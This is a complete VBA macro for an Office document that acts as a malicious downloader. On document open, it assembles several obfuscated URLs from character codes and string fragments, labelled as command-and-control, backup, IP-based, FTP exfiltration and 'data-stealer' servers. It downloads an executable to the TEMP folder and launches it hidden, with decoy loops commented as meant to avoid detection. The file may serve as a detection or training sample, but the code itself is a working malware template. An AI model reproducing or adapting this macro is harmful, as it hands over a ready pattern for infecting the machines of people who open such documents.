' Microsoft Office VBA Macro
' Document_Open Event Handler
' WARNING: This macro contains suspicious code patterns

Option Explicit

Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As Long, _
    ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, _
    ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, _
    ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

' Global configuration variables
Dim strProtocol1 As String
Dim strProtocol2 As String
Dim strProtocol3 As String
Dim strHostname As String
Dim strEndpoint As String
Dim arrConfig() As String
Dim intCounter As Integer

Sub AutoOpen()
    ' Initialize on document open
    On Error Resume Next
    Call InitializeConfig
    Call ProcessDocument
    Call ExecutePayload
End Sub

Sub Document_Open()
    ' Backup trigger for document open
    AutoOpen
End Sub

Function InitializeConfig() As Boolean
    ' Setup initial configuration parameters
    Dim strTemp As String
    Dim i As Integer
    
    ' Build protocol strings using character codes
    strProtocol1 = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
    strProtocol2 = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47)
    strProtocol3 = Chr(102) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
    
    ' Decoy operations to avoid detection
    intCounter = 0
    For i = 1 To 10
        intCounter = intCounter + i
    Next i
    
    ' Initialize configuration array
    ReDim arrConfig(5)
    
    InitializeConfig = True
End Function

Function GetPrimaryServer() As String
    ' Construct primary command and control server
    Dim strPart1 As String
    Dim strPart2 As String
    Dim strPart3 As String
    Dim strPart4 As String
    Dim strComplete As String
    
    ' Build hostname using concatenation
    strPart1 = "malicious"
    strPart2 = "-"
    strPart3 = "command"
    strPart4 = ".net"
    
    strHostname = strPart1 & strPart2 & strPart3 & strPart4
    
    ' Add path component
    strEndpoint = "/api/v2/payload.exe"
    
    ' Combine all parts
    strComplete = strProtocol1 & strHostname & strEndpoint
    
    GetPrimaryServer = strComplete
End Function

Function GetBackupServer() As String
    ' Secondary server configuration
    Dim arrParts() As Variant
    Dim strResult As String
    Dim intIndex As Integer
    
    ' Store parts in array for reconstruction
    arrParts = Array("https://", "backup", "-", "server", ".com", "/downloads/", "update", ".bin")
    
    strResult = ""
    For intIndex = LBound(arrParts) To UBound(arrParts)
        strResult = strResult & arrParts(intIndex)
    Next intIndex
    
    GetBackupServer = strResult
End Function

Function GetIPBasedServer() As String
    ' Direct IP address connection
    Dim strIP1 As String
    Dim strIP2 As String
    Dim strIP3 As String
    Dim strIP4 As String
    Dim strPort As String
    Dim strPath As String
    Dim strFinal As String
    
    ' Build IP address piece by piece
    strIP1 = Chr(49) & Chr(57) & Chr(50)  ' 192
    strIP2 = Chr(49) & Chr(54) & Chr(56)  ' 168
    strIP3 = Chr(53) & Chr(48)            ' 50
    strIP4 = Chr(49) & Chr(48) & Chr(48)  ' 100
    
    ' Port number
    strPort = Chr(56) & Chr(48) & Chr(56) & Chr(48)  ' 8080
    
    ' Path component
    strPath = Chr(47) & "data" & Chr(47) & "collect"
    
    ' Assemble complete URL
    strFinal = strProtocol2 & strIP1 & "." & strIP2 & "." & strIP3 & "." & strIP4 & ":" & strPort & strPath
    
    GetIPBasedServer = strFinal
End Function

Function GetFTPServer() As String
    ' FTP exfiltration server
    Dim strServer As String
    Dim strDomain As String
    Dim strTLD As String
    Dim strResource As String
    Dim strBuilt As String
    
    ' Character by character construction
    strServer = Chr(101) & Chr(120) & Chr(102) & Chr(105) & Chr(108)  ' exfil
    strDomain = Chr(45) & Chr(115) & Chr(101) & Chr(114) & Chr(118) & Chr(101) & Chr(114)  ' -server
    strTLD = Chr(46) & Chr(111) & Chr(114) & Chr(103)  ' .org
    strResource = "/upload/data.zip"
    
    strBuilt = strProtocol3 & strServer & strDomain & strTLD & strResource
    
    GetFTPServer = strBuilt
End Function

Function GetAlternateEndpoint() As String
    ' Alternative endpoint using mixed obfuscation
    Dim varParts As Variant
    Dim strHost As String
    Dim strFinalURL As String
    Dim idx As Integer
    
    ' Build hostname from character codes
    strHost = Chr(100) & Chr(97) & Chr(116) & Chr(97)  ' data
    strHost = strHost & Chr(45)  ' -
    strHost = strHost & Chr(115) & Chr(116) & Chr(101) & Chr(97) & Chr(108) & Chr(101) & Chr(114)  ' stealer
    strHost = strHost & Chr(46) & Chr(105) & Chr(110) & Chr(102) & Chr(111)  ' .info
    
    ' Decoy calculation
    idx = 0
    For idx = 1 To 5
        DoEvents
    Next idx
    
    ' Path array
    varParts = Array("/", "gate", "way", "/", "submit", ".php")
    
    strFinalURL = strProtocol1 & strHost
    For idx = LBound(varParts) To UBound(varParts)
        strFinalURL = strFinalURL & varParts(idx)
    Next idx
    
    GetAlternateEndpoint = strFinalURL
End Function

Sub ProcessDocument()
    ' Process document and prepare environment
    Dim strConfig As String
    Dim intResult As Integer
    
    ' Store all server configurations
    arrConfig(0) = GetPrimaryServer()
    arrConfig(1) = GetBackupServer()
    arrConfig(2) = GetIPBasedServer()
    arrConfig(3) = GetFTPServer()
    arrConfig(4) = GetAlternateEndpoint()
    
    ' Decoy document processing
    intResult = PerformDecoyOperations()
    
End Sub

Function PerformDecoyOperations() As Integer
    ' Legitimate-looking operations to mask intent
    Dim objDoc As Object
    Dim intPages As Integer
    Dim strContent As String
    
    On Error Resume Next
    Set objDoc = ActiveDocument
    intPages = objDoc.ComputeStatistics(wdStatisticPages)
    
    ' Additional decoy loops
    Dim j As Integer
    For j = 1 To intPages
        strContent = strContent & " "
    Next j
    
    PerformDecoyOperations = intPages
End Function

Sub ExecutePayload()
    ' Main payload execution routine
    Dim strURL As String
    Dim strLocalPath As String
    Dim lngResult As Long
    Dim intAttempt As Integer
    
    On Error Resume Next
    
    ' Set download location
    strLocalPath = Environ("TEMP") & "\update.exe"
    
    ' Attempt connection to each configured server
    For intAttempt = LBound(arrConfig) To UBound(arrConfig)
        If arrConfig(intAttempt) <> "" Then
            strURL = arrConfig(intAttempt)
            
            ' Call download function
            lngResult = URLDownloadToFileA(0, strURL, strLocalPath, 0, 0)
            
            If lngResult = 0 Then
                ' Execute downloaded payload
                Call LaunchPayload(strLocalPath)
                Exit For
            End If
        End If
    Next intAttempt
    
End Sub

Sub LaunchPayload(strFilePath As String)
    ' Execute the downloaded file
    Dim lngHandle As Long
    
    On Error Resume Next
    lngHandle = ShellExecuteA(0, "open", strFilePath, "", "", 0)
    
End Sub

Function CalculateChecksum(strData As String) As Long
    ' Decoy checksum function
    Dim i As Long
    Dim lngSum As Long
    
    lngSum = 0
    For i = 1 To Len(strData)
        lngSum = lngSum + Asc(Mid(strData, i, 1))
    Next i
    
    CalculateChecksum = lngSum
End Function

Sub CleanupTemporaryFiles()
    ' Remove traces
    On Error Resume Next
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Decoy cleanup operations
    Dim strTempPath As String
    strTempPath = Environ("TEMP")
    
End Sub